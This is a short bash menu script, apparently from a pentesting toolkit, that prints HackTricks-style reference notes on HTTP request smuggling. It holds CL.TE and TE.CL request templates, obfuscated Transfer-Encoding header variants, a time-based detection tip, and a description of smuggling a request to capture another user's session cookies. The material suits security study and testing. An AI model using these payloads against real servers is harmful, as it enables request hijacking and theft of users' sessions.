#!/bin/bash
# HackTricks Ref: http-request-smuggling
# Module: HTTP Request Smuggling (CL.TE / TE.CL / TE.TE)

echo -e "${C6}[WEB ATTACK: SERVER_SMUGGLING_REQUEST]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/http-request-smuggling"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Smuggling Vector:${NC}"
echo "1) CL.TE (Front-end uses CL, Back-end uses TE)"
echo "2) TE.CL (Front-end uses TE, Back-end uses CL)"
echo "3) TE.TE (Both use TE, but one can be obfuscated)"
echo "4) Detection & Identification (Time-based)"
echo "5) Smuggling to Internal Header Leakage"
echo "0) Exit"

read -p "Selection: " hrs_opt

case $hrs_opt in
    1)
        echo -e "\n${C2}[*] CL.TE Vector:${NC}"
        echo "The Front-end looks at Content-Length, Back-end looks at Transfer-Encoding."
        echo "Payload Example:"
        echo "POST / HTTP/1.1"
        echo "Content-Length: 13"
        echo "Transfer-Encoding: chunked"
        echo -e "\n0"
        echo "SMUGGLED"
        ;;
    2)
        echo -e "\n${C2}[*] TE.CL Vector:${NC}"
        echo "Front-end looks at TE, Back-end looks at CL."
        echo "Payload Example:"
        echo "POST / HTTP/1.1"
        echo "Content-Length: 3"
        echo "Transfer-Encoding: chunked"
        echo -e "\n8"
        echo "SMUGGLED"
        echo "0"
        ;;
    3)
        echo -e "\n${C2}[*] TE.TE Vector:${NC}"
        echo "Obfuscate one TE header so one server ignores it:"
        echo " - Transfer-Encoding: xchunked"
        echo " - Transfer-Encoding : chunked"
        echo " - Transfer-Encoding: [tab]chunked"
        ;;
    4)
        echo -e "\n${C2}[*] Time-based Detection:${NC}"
        echo "If you send an incomplete request and the server waits for more data,"
        echo "a timeout indicates a potential smuggling vulnerability."
        echo -e "${C4}Tool:${NC} HTTP Request Smuggler (Burp Suite Extension)"
        ;;
    5)
        echo -e "\n${C2}[*] Header Leakage Attack:${NC}"
        echo "Smuggle a request that 'pre-fills' the next user's request,"
        echo "forcing the server to reflect the victim's headers (like Session Cookies)."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
